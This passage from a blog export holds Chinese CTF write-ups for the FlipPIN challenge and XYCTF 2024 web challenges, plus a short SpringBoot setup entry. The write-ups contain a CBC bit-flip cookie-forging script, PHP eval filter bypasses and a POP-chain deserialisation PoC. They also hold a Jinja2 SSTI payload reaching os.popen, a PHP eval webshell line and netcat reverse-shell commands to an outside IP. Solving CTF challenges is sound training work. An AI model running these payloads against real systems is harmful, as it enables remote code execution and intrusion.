class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(</span><br><span class="line">            <span class="string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session).decode())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;have a fun&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    res = Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line"></span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(<span class="string">&quot;you are not logged in&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plain_session = decrypt(session)</span><br><span class="line">        <span class="keyword">if</span> plain_session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;don\&#x27;t hack me&#x27;</span></span><br><span class="line"></span><br><span class="line">        session_data = json.loads(plain_session)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&#x27;admin&#x27;</span>] :</span><br><span class="line">            filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(blacklist_str <span class="keyword">in</span> filename <span class="keyword">for</span> blacklist_str <span class="keyword">in</span> filename_blacklist):</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&#x27;Access to this file is forbidden.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.read()</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                abort(<span class="number">404</span>, description=<span class="string">&#x27;File not found.&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                abort(<span class="number">500</span>, description=<span class="string">f&#x27;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;You are not an administrator&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9091</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>考察CBC反转攻击</p><p><a href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a></p><p>贴一个其他师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    1. 分组 16个字节一组</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&quot;admin&quot;: 0, &quot;us</span></span><br><span class="line"><span class="comment"># ername&quot;: &quot;user1&quot;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    2. 获取原始密文</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">ciphertext = <span class="string">&#x27;wv7sRdpuU1HMAgqUWAOjoZuLsH9jUDnCaVtBxN8fQH6zyxmGqarbH7R/cuSUVx1xnKKDoUjIeo1GQwkg39DZ6Q==&#x27;</span></span><br><span class="line">cipher = base64.b64decode(urllib.parse.unquote(ciphertext))</span><br><span class="line">array_cipher = <span class="built_in">bytearray</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    3， 字节翻转</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line">array_cipher[offset] =  array_cipher[offset]^ <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;newCipher:&#x27;</span>,urllib.parse.quote(base64.b64encode(array_cipher)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后就是文件读取+flask pin计算, 偷个懒</p><h2 id="奇怪的网站"><a href="#奇怪的网站" class="headerlink" title="奇怪的网站"></a>奇怪的网站</h2><p>目录扫描可以扫描出来&#x2F;404.php &#x2F;flag.php</p><p>访问网站时有一个302重定向, 这里有提示</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240530001443451.png" alt="image-20240530001443451"></p><p>如果有使用vim的经验的化我们知道vim在异常退出的时候会生成一个隐藏的缓存文件的</p><blockquote><p>第一次产生的缓存文件后缀为.swp，第二次则产生的缓存文件后缀为.swo,第三次产生的缓存文件后缀为.swn, 第四次产生的缓存文件后缀为.swm</p></blockquote><h2 id="GPTS"><a href="#GPTS" class="headerlink" title="GPTS"></a>GPTS</h2><p><a href="https://xz.aliyun.com/t/14283?time__1311=mqmx9QiQKDqGqx05dIDymDuDAOqf2+kdurD&alichlgref=https://www.bing.com/">https://xz.aliyun.com/t/14283?time__1311=mqmx9QiQKDqGqx05dIDymDuDAOqf2%2BkdurD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F</a></p><h2 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h2>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python内存马 </tag>
            
            <tag> CBC翻转攻击 </tag>
            
            <tag> 侧信道 </tag>
            
            <tag> Flask Pin码计算 </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot学习</title>
      <link href="/2024/05/24/SpringBoot%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/05/24/SpringBoot%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="IDEA创建SpringBoot项目"><a href="#IDEA创建SpringBoot项目" class="headerlink" title="IDEA创建SpringBoot项目"></a>IDEA创建SpringBoot项目</h2><p>选择创建Spring Initializr</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524192417970.png" alt="image-20240524192417970"></p><p>勾选Spring web</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524192559708.png" alt="image-20240524192559708"></p><p>此时idea会默认为我们创建一个SpringBoot项目</p><p>由于我们使用是jdk 1.8, 这里会踩坑</p><p>我们需要更改SpringBoot版本为2.x否则会报错</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524193743796.png" alt="image-20240524193743796"></p><p>这里java版本也改成java8</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524193758233.png" alt="image-20240524193758233"></p><p>之后成功运行</p><p>可以看见Tomcat已经启动了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524194045710.png" alt="image-20240524194045710"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF 2024 Web</title>
      <link href="/2024/04/28/XYCTF-2024-Web/"/>
      <url>/2024/04/28/XYCTF-2024-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="XYCTF-2024-Web"><a href="#XYCTF-2024-Web" class="headerlink" title="XYCTF 2024 Web"></a>XYCTF 2024 Web</h1><h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h2><p>略</p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>略</p><h2 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h2><p>相同md5图片, 一搜就有, 略</p><h2 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;肘死你&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先要添加一个<code>%0a</code>让代码不被#注释, 然后用<code>%23</code>再把,manba out注释掉</p><p>$(which sh)代替bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0a`$_GET[1]`;%23</span><br><span class="line">&amp;1=nc 107.148.75.202 1234 -e $(which sh)</span><br></pre></td></tr></table></figure><h2 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a><strong>ezMake</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php if(eval($$_POST[1])) ?&gt;&#x27; &gt; a.php</span><br></pre></td></tr></table></figure><h2 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a><strong>ez?Make</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 107.148.75.202 1234  -e `which sh`</span><br></pre></td></tr></table></figure><h2 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;win&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = [<span class="number">1</span> =&gt; <span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;c-&gt;s = <span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><p>配合fast-destruct</p><h2 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h2><p>admin密码: asdqwe</p><p>找catch_warnings</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xyctf.top:36318/index&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZgzePQ.xovem1N0fv78Nth8E0_iXRxY7UA&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sentence = <span class="string">&#x27;?sentence=你好()|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(&#123;&#125;)&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = url + sentence</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    <span class="built_in">print</span>(payload.<span class="built_in">format</span>(<span class="built_in">str</span>(i)))</span><br><span class="line">    res = requests.get(url=payload.<span class="built_in">format</span>(<span class="built_in">str</span>(i)), headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;catch_warnings&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;found catch_warnings is in &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;出现了一点小问题&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#found catch_warnings is in 221</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sentence=你好()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(221)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)</span><br><span class="line">&amp;x1=__class__</span><br><span class="line">&amp;x2=__base__</span><br><span class="line">&amp;x3=__subclasses__</span><br><span class="line">&amp;x4=__getitem__</span><br><span class="line">&amp;x5=__init__</span><br><span class="line">&amp;x6=__globals__</span><br><span class="line">&amp;x7=__builtins__</span><br><span class="line">&amp;x8=eval</span><br><span class="line">&amp;x9=__import__(&quot;os&quot;).popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h2><p>没什么好说的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;password = &amp;<span class="variable">$nacl</span>-&gt;token;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span 